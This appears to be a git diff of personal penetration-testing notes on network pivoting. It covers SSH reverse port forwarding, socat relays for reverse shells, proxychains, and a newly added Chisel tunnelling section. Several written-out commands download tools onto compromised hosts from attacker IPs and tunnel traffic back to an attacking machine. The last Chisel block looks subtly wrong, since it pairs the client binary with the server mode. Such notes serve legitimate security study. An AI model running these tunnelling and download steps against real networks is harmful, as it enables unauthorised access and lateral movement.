@@ -133,7 +133,7 @@ ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
 ```
 
 
-## Socat
+# Socat
 
 socat makes a very good relay: for example, if you are attempting to get a shell on a target that does not have a direct connection back to your attacking computer, you could use socat to set up a relay on the currently compromised machine. This listens for the reverse shell from the target and then forwards it immediately back to the attacking box:
 
@@ -161,5 +161,29 @@ socks4 127.0.0.1 9000
 
 ```
 proxychains curl http://10.50.88.33:8080/socat_sardarji -o socat_sardarji
+```
+
+
+# Chisel 
+
+[Chisel](https://github.com/jpillora/chisel) is an awesome tool which can be used to quickly and easily set up a tunnelled proxy or port forward through a compromised system, regardless of whether you have SSH access or not. It's written in Golang and can be easily compiled for any system (with static release binaries for Linux and Windows provided). In many ways it provides the same functionality as the standard SSH proxying / port forwarding we covered earlier; however, the fact it doesn't require SSH access on the compromised target is a big bonus.
+
+Before we can use chisel, we need to download appropriate binaries from the tool's [Github release page](https://github.com/jpillora/chisel/releases). These can then be unzipped using `gunzip`, and executed as normal:
+
+
+### Chisel binary has two modes: _client_ and _server_.
+
+Attack Machine
+```
+./chisel server -p LISTEN_PORT --reverse &
+```
+
+```
+curl 10.50.106.240/chisel_1.9.1_linux_amd64  -o chisel-sardarji
+```
+
+```
+Attacker
+./client server -p 1337 --reverse &
 ```
 
